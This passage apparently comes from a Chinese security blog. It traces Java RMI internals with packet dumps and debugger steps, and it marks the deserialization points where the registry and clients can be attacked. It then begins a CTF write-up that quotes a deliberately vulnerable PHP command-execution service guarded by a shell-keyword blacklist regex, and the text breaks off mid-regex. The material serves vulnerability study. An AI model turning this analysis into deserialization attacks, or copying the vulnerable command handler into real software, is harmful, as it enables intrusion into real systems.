class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000   00 0c 29 97 34 1c 00 50 56 fb 95 99 08 00 45 00   ..).4..PV.....E.</span><br><span class="line">0010   01 5f ff 13 00 00 80 06 c3 a8 c0 a8 01 0b c0 a8   ._..............</span><br><span class="line">0020   f4 80 04 4b c3 b0 3e 74 47 95 a8 61 e0 04 50 18   ...K..&gt;tG..a..P.</span><br><span class="line">0030   fa f0 b2 f6 00 00 51 ac ed 00 05 77 0f 01 6e 7a   ......Q....w..nz</span><br><span class="line">0040   dd fb 00 00 01 8f ec 5e 33 e9 80 0e 73 7d 00 00   .......^3...s&#125;..</span><br><span class="line">0050   00 02 00 0f 6a 61 76 61 2e 72 6d 69 2e 52 65 6d   ....java.rmi.Rem</span><br><span class="line">0060   6f 74 65 00 0e 6f 72 67 2e 72 6d 69 2e 49 48 65   ote..org.rmi.IHe</span><br><span class="line">0070   6c 6c 6f 70 78 72 00 17 6a 61 76 61 2e 6c 61 6e   llopxr..java.lan</span><br><span class="line">0080   67 2e 72 65 66 6c 65 63 74 2e 50 72 6f 78 79 e1   g.reflect.Proxy.</span><br><span class="line">0090   27 da 20 cc 10 43 cb 02 00 01 4c 00 01 68 74 00   &#x27;. ..C....L..ht.</span><br><span class="line">00a0   25 4c 6a 61 76 61 2f 6c 61 6e 67 2f 72 65 66 6c   %Ljava/lang/refl</span><br><span class="line">00b0   65 63 74 2f 49 6e 76 6f 63 61 74 69 6f 6e 48 61   ect/InvocationHa</span><br><span class="line">00c0   6e 64 6c 65 72 3b 70 78 70 73 72 00 2d 6a 61 76   ndler;pxpsr.-jav</span><br><span class="line">00d0   61 2e 72 6d 69 2e 73 65 72 76 65 72 2e 52 65 6d   a.rmi.server.Rem</span><br><span class="line">00e0   6f 74 65 4f 62 6a 65 63 74 49 6e 76 6f 63 61 74   oteObjectInvocat</span><br><span class="line">00f0   69 6f 6e 48 61 6e 64 6c 65 72 00 00 00 00 00 00   ionHandler......</span><br><span class="line">0100   00 02 02 00 00 70 78 72 00 1c 6a 61 76 61 2e 72   .....pxr..java.r</span><br><span class="line">0110   6d 69 2e 73 65 72 76 65 72 2e 52 65 6d 6f 74 65   mi.server.Remote</span><br><span class="line">0120   4f 62 6a 65 63 74 d3 61 b4 91 0c 61 33 1e 03 00   Object.a...a3...</span><br><span class="line">0130   00 70 78 70 77 36 00 0a 55 6e 69 63 61 73 74 52   .pxpw6..UnicastR</span><br><span class="line">0140   65 66 00 0d 31 39 32 2e 31 36 38 2e 32 34 34 2e   ef..192.168.244.</span><br><span class="line">0150   31 00 00 f0 20 bb b8 2f e8 ae 23 c6 5f 6e 7a dd   1... ../..#._nz.</span><br><span class="line">0160   fb 00 00 01 8f ec 5e 33 e9 80 01 01 78            ......^3....x</span><br></pre></td></tr></table></figure><p>行0030 中<code>\xAC\xED</code>(ac ed)是Java序列化的魔术头，该数据流往后的部分就是序列化的内容了.</p><p>行0150 中<code>\xF0 \x20</code>(f0 20)转换为十进制是61474, 这就是Server在本地开放的随机端口,这和之后与端口61474相对应</p><p>因此这条TCP链的作用就是Client根据传入的rmi地址链接远端服务器1099端口上的RMI Registry, 然后Registry向Client发送Server上的序列化数据，包括IP和开放的随机端口等。</p><p>再往下是第二个TCP链接, Client连接ReturnData中返回的端口，这条TCP链接用于Client与Server之间的传输数据。实际上是Client的Stub和Server上的Skeleton之间进行数据传输的。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606162034685.png" alt="image-20240606162034685"></p><p>之后是TCP四次挥手, 断开TCP连接</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606162204581.png" alt="image-20240606162204581"></p><p>在此之中, Registry充当着类似网关的角色, 为Client返回远程对象的绑定信息, 然后Client的Stub连接位于Server上的Skeleton，最终远程方法还是在服务器上执行。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/%E5%9B%BE%E7%89%87-81-1024x633.png" alt="图片-81-1024x633"></p><h2 id="RMI有关类介绍"><a href="#RMI有关类介绍" class="headerlink" title="RMI有关类介绍"></a>RMI有关类介绍</h2><h4 id="LiveRef"><a href="#LiveRef" class="headerlink" title="LiveRef"></a>LiveRef</h4><p><code>LiveRef</code> 是 <code>java.rmi.server</code> 包中的一个类，负责管理远程对象的引用。它包括以下功能：</p><ol><li><strong>标识远程对象</strong>：每个远程对象在 JVM 中都有一个唯一的 <code>LiveRef</code> 实例，该实例用于唯一标识该远程对象。</li><li><strong>管理连接</strong>：维护客户端与远程对象之间的连接，确保远程对象的调用能够正确传递。</li><li><strong>引用计数</strong>：跟踪对远程对象的引用计数，以便在不再需要时正确地清理和回收资源。</li></ol><h4 id="UnicastRef"><a href="#UnicastRef" class="headerlink" title="UnicastRef"></a>UnicastRef</h4><p><code>UnicastRef</code> 负责处理远程方法调用的序列化和反序列化，将调用参数从客户端传输到服务器，并将结果从服务器返回给客户端。</p><p>它管理底层的网络连接和通信协议，确保远程方法调用能够正确地传递和处理。</p><p><code>UnicastRef</code> 包含一个 <code>LiveRef</code> 实例(封装)，<code>LiveRef</code> 保存了远程对象的引用信息，如对象标识符（<code>ObjID</code>）、远程对象所在的地址（<code>Endpoint</code>）、以及用于通信的底层通道。</p><h5 id="关键方法和属性"><a href="#关键方法和属性" class="headerlink" title="关键方法和属性"></a>关键方法和属性</h5><ul><li>**<code>newCall</code>**：创建一个新的远程调用。</li><li>**<code>invoke</code>**：执行远程调用。</li><li>**<code>done</code>**：完成远程调用并处理结果。</li></ul><h4 id="UnicastServerRef"><a href="#UnicastServerRef" class="headerlink" title="UnicastServerRef"></a>UnicastServerRef</h4><p><code>UnicastServerRef</code> 是 Java RMI（Remote Method Invocation）框架中的一个类，用于管理<strong>单播</strong>远程对象的引用。在 Java RMI 中，远程对象需要被导出以便能够被远程调用，<code>UnicastServerRef</code> 类就是处理这些对象<strong>引用</strong>的主要类之一。</p><p>UnicastServerRef封装了LiveRef</p><blockquote><p>单播远程对象（Unicast Remote Object）是指在 RMI 中，一个特定的远程对象实例，只能在一个特定的地址（主机和端口）上被访问。与之相对的是多播对象（Multicast Object），后者可以通过多个路径访问。</p></blockquote><p><code>UnicastServerRef</code> 类是 <code>UnicastRef</code> 类的子类，继承了其一些基础功能，并添加了处理服务器端逻辑的功能。</p><h4 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h4><p><code>UnicastRemoteObject</code> 是一个便捷类，简化了创建远程对象的过程。它扩展了 <code>java.rmi.server.RemoteServer</code> 并实现了 <code>java.rmi.server.ServerRef</code> 接口</p><p><code>UnicastRemoteObject</code> 封装了 <code>UnicastServerRef</code> 的功能。</p><p>具体来说，当你创建一个 <code>UnicastRemoteObject</code> 时，它会在内部创建一个 <code>UnicastServerRef</code> 实例来处理实际的远程调用。</p><h4 id="RegistryImpl"><a href="#RegistryImpl" class="headerlink" title="RegistryImpl"></a>RegistryImpl</h4><p><code>RegistryImpl</code> 是 RMI 的一个内部实现类，它实现了<code>Registry</code>接口, 用于实现注册表服务。</p><p><code>RegistryImpl</code> 封装了<code>UnicastServerRef</code>, 使用 <code>UnicastServerRef</code> 来管理其自身的网络通信和远程对象引用。</p><h2 id="RMI流程源码分析"><a href="#RMI流程源码分析" class="headerlink" title="RMI流程源码分析"></a>RMI流程源码分析</h2><p>有了上面对于RMI流程的分析，下面我们根据源码来捋一捋信息是怎么在Server、Client与Registry中流动的。</p><p>其总体的一个调用方式是这样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1592803976000-5xjsli.png" alt="1592803976000-5xjsli"></p><h3 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br></pre></td></tr></table></figure><h4 id="发布远程对象"><a href="#发布远程对象" class="headerlink" title="发布远程对象"></a>发布远程对象</h4><p>这里还是比较复杂, 我自己梳理了一下把关键步骤画了一个流程图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/rmi_server.jpg"></p><p>断点打在 RMIServer 的创建远程对象这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606170622577.png" alt="image-20240606170622577"></p><p>首先我们要分析的是一个远程对象是如何被发布到网络上去的</p><p><strong><code>RMIHello</code></strong> 这个类是继承于 <code>UnicastRemoteObject</code> 的，我们使用了父类的构造器来创建它。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606171457782.png" alt="image-20240606171457782"></p><p>这里exportObject表示导出(发布)这个对象自身(this)到0端口(后面会看见这其实表示随机端口),</p><p>F7跟进exportObject()</p><p><code>exportObject()</code> 是一个静态函数，它就是主要负责<strong>将远程服务发布到网络上</strong></p><p>第一个参数是 obj 对象，第二个参数是 <code>new UnicastServerRef(port)</code>，第二个参数是用来处理网络请求的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172149233.png" alt="image-20240606172149233"></p><p>这里实际上是一个动态代理中典型的封装操作, obj本身是一个要被发布出去的对象, 这个对象只在乎其包含了哪些功能, 对于如何发布它, 它如何与客户端进行网络请求并不关心, 因此这里的<code>UnicastServerRef</code>就是利用动态代理的方式来增强这个对象, 完成网络请求的功能</p><p>继续跟进<code>UnicastServerRef</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172355596.png" alt="image-20240606172355596"></p><p>它 new 了一个 LiveRef(port)，这个非常重要，它算是一个网络引用的类，跟进看一看。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172501903.png" alt="image-20240606172501903"></p><p>跟进去之后，先是一个构造函数，先跳进 this 看一看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172556199.png" alt="image-20240606172556199"></p><p>第一个参数 ID，第三个参数为 true，所以我们重点关注一下第二个参数。</p><blockquote><p>TCPEndpoint 是一个网络请求的类，我们可以去看一下它的构造函数，传参进去一个 IP 与一个端口，也就是说传进去一个 IP 和一个端口，就可以进行网络请求。</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172722549.png" alt="image-20240606172722549"></p><p>F8跳过这个方法, 继续F7进到 LiveRef 的构造函数 this 里面</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606172942389.png" alt="image-20240606172942389"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606173251407.png" alt="image-20240606173251407"></p><p>此时发现 host 和 port 是赋值到了 endpoint 里面，而 endpoint 又是被封装在 LiveRef 里面的，</p><p>所以这些网络请求相关的数据是在 LiveRef 里面，并且这一 LiveRef 至始至终只会存在一个。</p><p>上述是 LiveRef 创建的过程，然后我们一路F8再回到之前出现 <code>LiveRef(port)</code> 的地方</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174046968.png" alt="image-20240606174046968"></p><p>刚刚看完了new LiveRef() 的过程, 接下来F7到super中看一看它的父类 <code>UnicastRef</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174412573.png" alt="image-20240606174412573"></p><p>这里<code>UnicastServerRef</code> 是继承了<code>UnicastRef</code>,</p><p>此时<code>ref</code>这个属性就是对其在网络上的一个描述, 包括了其所开放在的ip与端口位置</p><p>一路 f7 回到exportObject()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174558218.png" alt="image-20240606174558218"></p><p>此前我们分析的是new UnicastServerRef(port)的过程, 继续F7</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606174637562.png" alt="image-20240606174637562"></p><p>刚刚的sref(也就是对远程对象在网络上位置的描述)被赋值给了远程对象obj的ref属性</p><p>继续往后看, 进去下面那个<code>sref.exportObject()</code> 注意此时调用的是sref(也就是程序中新创建的)的方法, 并不是远程对象的属性ref</p><p>直到此处出现 Stub</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175005366.png" alt="image-20240606175005366"></p><p>Stub明明是Client中的存根, 为什么会出现在Server中呢?</p><blockquote><ul><li>RMI 先在 Service 的地方，也就是服务端创建一个 Stub，再把 Stub 传到 RMI Registry 中，最后让 RMI Client 去获取 Stub。</li></ul></blockquote><p>接着我们研究 Stub 产生的这一步，</p><p>先F8到197行, 再F7进到 <code>createProxy</code> 这个方法里面</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175626515.png" alt="image-20240606175626515"></p><p>注意: 这里的第二个参数<code>clientRef</code> 由<code>getClientRef()</code>产生, 通过观察变量值, 他与服务器上远程对象的ref属性是同一个</p><p>我们往下看, 这里并不会进去if里面, 先不看这个if</p><p> 可以看见下面有一个很明显的动态代理</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606175615840.png" alt="image-20240606175615840"></p><p>第一个参数是 <code>AppClassLoader</code>，第二个参数是一个远程接口，第三个参数是调用处理器，调用处理器里面只有一个 ref，它也是和之前我们看到的 ref 是同一个</p><p>创建远程服务当中永远只有一个 ref。</p><p>继续F8</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205627290.png" alt="image-20240606205627290"></p><p>到这里就把动态代理创建好了，如图创建好了一个Stub等待客户端来获取(这个Stub并不包含远程对象本身)</p><p>继续 f8，到 Target 这里，Target 这里相当于一个总的封装，将所有用的东西放到 Target 里面，我们可以进去看一看 Target 里面都放了什么。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205812091.png" alt="image-20240606205812091"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606205839158.png" alt="image-20240606205839158"></p><p>并且这里的几个 ref 都是同一个，通过 ID 就可以查看到它们是同一个。比如比较 disp 和 stub 的。一个是服务端 ，一个是客户端的，ID 是一样的，</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606222744415.png" alt="image-20240606222744415"></p><p>一路 f8，回到之前的 Target，下一条语句是 <code>ref.exportObject(target)</code>，把 target 这个封装好了的对象发布出去。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606222922598.png" alt="image-20240606222922598"></p><p>我们一路F7跟进, 直到这里的listen进行网络请求</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223026872.png" alt="image-20240606223026872"></p><p>继续F7跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223314933.png" alt="image-20240606223314933"></p><p>这里获取了<code>TCPEndpoint</code></p><p>我们F8进入到<code>server = ep.newServerSocket();</code>这里跟进</p><p>它创建了一个新的 socket，已经准备好了，等别人来连接</p><p>并且这个 <code>newServerSocket()</code> 方法会给 port 进行赋值, 若port被设置为0则随机赋一个值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606223854543.png" alt="image-20240606223854543"></p><p>然后回到 listen 去，一路 f8，观察一下整个流程结束之后 Target 里面是增加了 port。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606224204732.png" alt="image-20240606224204732"></p><h4 id="发布完成之后的记录"><a href="#发布完成之后的记录" class="headerlink" title="发布完成之后的记录"></a>发布完成之后的记录</h4><p>我们F7进去<code>super.exportObject(target);</code>这里, 也就是上一张图片的260行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606224724277.png" alt="image-20240606224724277"></p><p>我们F7跟进<code>ObjectTable.putTarget(target);</code></p><p>进去后一路F8 </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606225107839.png" alt="image-20240606225107839"></p><p>直到此处, RMI 这里会把所有的信息保存到<strong>两个 table</strong>里面</p><p>类似于日志, 这些记录是保存到静态的 HashMap 当中。</p><h3 id="创建注册中心-绑定"><a href="#创建注册中心-绑定" class="headerlink" title="创建注册中心 + 绑定"></a>创建注册中心 + 绑定</h3><p>我们使用<code>registry.bind</code>来注册, 断电打在这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606225831522.png" alt="image-20240606225831522"></p><p>可以看见<code>createRegistry</code>方法返回<code>RegistryImpl</code>对象</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606165122844.png" alt="image-20240606165122844"></p><p>F7进去, 有一大堆的安全验证不太重要直接F8过了</p><p>直到<code>RegistryImpl</code>, 我们F7进去</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606231221520.png" alt="image-20240606231221520"></h3><p>这里有一步判断 port 是否为注册中心的 port</p><p>再往下走，它创建了一个 <code>LiveRef</code>，以及创建了一个新的 <code>UnicastServerRef</code>，这段代码就和我们上面讲的创建远程对象是很类似的，我们可以跟进 <code>setup</code> 看一下</p><p>跟进之后发现和之前是一样的，也是先赋值，然后进行 <code>exportObject()</code> 方法的调用。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606231642087.png" alt="image-20240606231642087"></p><p>我们还是F7进入<code>exportObject</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607184256288.png" alt="image-20240607184256288"></p><p>到了创建 Stub 的阶段。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607185404298.png" alt="image-20240607185404298"></p><p>这里与发布对象时有所不同, 这里会进到<code>createStub</code>这个函数中, 发布对象时不进入这个if, 往后直接创建了动态代理</p><p>跟进去看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607185801158.png" alt="image-20240607185801158"></p><p>这里使用<code>forname</code>反射创建</p><p>一路F8, 回到<code>createProxy</code>的地方, 下面就是<code>setSkeleton</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607190052291.png" alt="image-20240607190052291"></p><p>顾名思义就是创建<code>Skeleton</code>骨架</p><p>再往后就是创建<code>Target</code>与之前相同 F8跳过</p><p>直到一步<code>super.exportObject()</code>进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240607212901501.png" alt="image-20240607212901501"></p><p>这里也和之前类似, 把封装的 target put到一个table里, 我们可以跟进去putTarget看一下, 去之前的操作是类似的</p><p>我们F8把这些流程走完, 之后就是保存了一些数据</p><p>我们再来看绑定是如何实现的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240608115147520.png" alt="image-20240608115147520"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240608115313738.png" alt="image-20240608115313738"></p><p>这里首先检查bindings这个hashTable是否为空, 若空则把远程对象的引用放进去(ip 端口)</p><p>比较简单的一个过程</p><p>这里我也画了一个大致的流程图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/RMI_Registry_2.jpg" alt="RMI_Registry_2"></p><h3 id="客户端调用注册中心"><a href="#客户端调用注册中心" class="headerlink" title="客户端调用注册中心"></a>客户端调用注册中心</h3><p>前面都是很安全的操作, 到这一步, 如之前抓包所说, 存在反序列化的操作, 因此这里是受威胁的</p><h4 id="获取注册中心"><a href="#获取注册中心" class="headerlink" title="获取注册中心"></a>获取注册中心</h4><p>这个过程去创建注册中心是高度相似的, 就不做展示了</p><p>我们快速过完后就会发现这里已经获取到注册中心的stub了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609152349355.png" alt="image-20240609152349355"></p><h4 id="lookup查找远程对象"><a href="#lookup查找远程对象" class="headerlink" title="lookup查找远程对象"></a>lookup查找远程对象</h4><p>很可惜这里有一部分是.class文件,没法调试, 在lookup处打断点会跳转到别的地方</p><p>不过问题不大, 我们先F8找到lookup处</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609153619883.png" alt="image-20240609153619883"></p><p>注意这里的<code>var3.writeObject(var1);</code>var1是lookup的参数, 也就是<code>hello</code>这里被反序列化后传了进去, 在这之后registry会反序列化读取, 这就造成了威胁</p><p>后面就是<code>super.ref.invoke(var2);</code>这里<code>super.ref</code>就是<code>UnicastRef</code>这个类, 我们直接去这个类下的invoke打断点</p><p>之后就可以跳转到这个方法中, 这里是可以调试的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609160036017.png" alt="image-20240609160036017"></p><p>这里的 <code>invoke()</code> 方法是类似于激活的方法</p><p><code>invoke</code>里会调用<code>call.executeCall();</code>它是真正处理网络请求的方法，也就是客户端的网络请求都是通过这个方法实现的。</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161551640.png" alt="image-20240609161551640"></p><p>这里往下会有一处<code>ReadObject</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161525554.png" alt="image-20240609161525554"></p><p><code>in</code>是在这里创建的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161732711.png" alt="image-20240609161732711"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609161757770.png" alt="image-20240609161757770"></p><p>不难理解，in 就是数据流里面的东西。</p><blockquote><p>这里获取异常的本意应该是在报错的时候把一整个信息都拿出来，这样会更清晰一点，但是这里就出问题了 ———— 如果一个注册中心返回一个恶意的对象，客户端进行反序列化，这就会导致漏洞。这里的漏洞相比于其他漏洞更为隐蔽。</p><ul><li>也就是说，只要调用 <code>invoke()</code>，就会导致漏洞。RMI 在设计之初就并未考虑到这个问题，导致客户端都是易受攻击的。</li></ul></blockquote><p>之后走完这个过程, 结束后我们就会获取到远程对象的动态代理, 其中包含了它的ref, 明确其开放的端口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609162034596.png" alt="image-20240609162034596"></p><h4 id="客户端请求服务端"><a href="#客户端请求服务端" class="headerlink" title="客户端请求服务端"></a>客户端请求服务端</h4><p>对应了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ihello.sayHello(<span class="string">&quot;hello, n4c1!&quot;</span>);</span><br></pre></td></tr></table></figure><p>由于ihello是一个动态代理, 因此我们会跳到它的handler的invoke方法中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609162755645.png" alt="image-20240609162755645"></p><p>这些if都不太重要, 主要是后面的</p><p>return invokeRemoteMethod(proxy, method, args);</p><p>这里看名字就知道是执行远程类的方法跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609164451084.png" alt="image-20240609164451084"></p><p>到这里的<code>ref.invoke</code>继续跟进</p><p>我们往下走到这一步</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609164746609.png" alt="image-20240609164746609"></p><p>跟进去</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165026740.png" alt="image-20240609165026740"></p><p>这里会将我们传给调用方法的参数序列化写进out里</p><p>之后再往下走就又到了<code>call.executeCall()</code>,即每进行一次网络请求都会调用<code>call.executeCall()</code>这个方法, 当然这里面是易受攻击的</p><p>我们继续往下, 就到了<code>unmarshalValue</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165448317.png" alt="image-20240609165448317"></p><p>这个方法与<code>marshalValue</code>类似, 但这个是<code>readObject</code>反序列化把connection中的数据读回来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609165903310.png" alt="image-20240609165903310"></p><p>因此这里也是易受攻击的</p><p>到这里这一块基本上就结束了</p><h3 id="客户端发起请求，注册中心如何处理"><a href="#客户端发起请求，注册中心如何处理" class="headerlink" title="客户端发起请求，注册中心如何处理"></a>客户端发起请求，注册中心如何处理</h3><p>断点打在下面这个位置,  找不到的话打开rt.jar(java核心类)</p><p>在sun.rmi.Transport.Transport.java中的<code>serviceCall</code>方法中.  </p><p>先debug服务端, 再运行客户端就可以断在这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609183403670.png" alt="image-20240609183403670"></p><p>F8过这条, 我们看Target中, 有一个Stub, 里面有一个ref对应着1099端口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609200115650.png" alt="image-20240609200115650"></p><p>再往下看<code>final Dispatcher disp = target.getDispatcher();</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609200944126.png" alt="image-20240609200944126"></p><p>这里是将 Target.disp(对应着<code>skel</code>) 的值放到 disp 里面。</p><p>继续往下走, 有一个<code>disp.dispatch(impl, call);</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609201951099.png" alt="image-20240609201951099"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202110937.png" alt="image-20240609202110937"></p><p>继续跟进这个<code>oldDispatch</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202255595.png" alt="image-20240609202255595"></p><p>注意这里又没法调试了, 代码会乱跳</p><p>我们需要把断点打在<code>sun.rmi.registry</code>包下的<code>RegistryImpl_Skel</code>类的<code>dispatch</code>方法中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609202852918.png" alt="image-20240609202852918"></p><p>这段代码是用来判断客户端向registry发起的请求方式的</p><p>有以下几种,以及其对应的编号</p><ul><li>0-&gt;bind</li><li>1-&gt;list</li><li>2-&gt;lookup</li><li>3-&gt;rebind</li><li>4-&gt;unbind</li></ul><p>只要对印的case中有反序列化就是易受攻击的</p><p>例如</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240609203336416.png" alt="image-20240609203336416"></p><p>实际上除了list都是可以攻击的</p><p>并且是客户端向registry发起攻击</p><h3 id="客户端发起请求，服务端如何处理"><a href="#客户端发起请求，服务端如何处理" class="headerlink" title="客户端发起请求，服务端如何处理"></a>客户端发起请求，服务端如何处理</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-RMI&quot;&gt;&lt;a href=&quot;#Java-RMI&quot; class=&quot;headerlink&quot; title=&quot;Java RMI&quot;&gt;&lt;/a&gt;Java RMI&lt;/h1&gt;&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buuoj一次刷个够</title>
    <link href="http://example.com/2024/05/30/buuoj%E4%B8%80%E6%AC%A1%E5%88%B7%E4%B8%AA%E5%A4%9F/"/>
    <id>http://example.com/2024/05/30/buuoj%E4%B8%80%E6%AC%A1%E5%88%B7%E4%B8%AA%E5%A4%9F/</id>
    <published>2024-05-30T05:51:33.000Z</published>
    <updated>2024-06-04T07:54:33.284Z</updated>
    
    <content type="html"><![CDATA[<h1 id="buuoj一次刷个够"><a href="#buuoj一次刷个够" class="headerlink" title="buuoj一次刷个够"></a>buuoj一次刷个够</h1><h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>网上扒来源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span 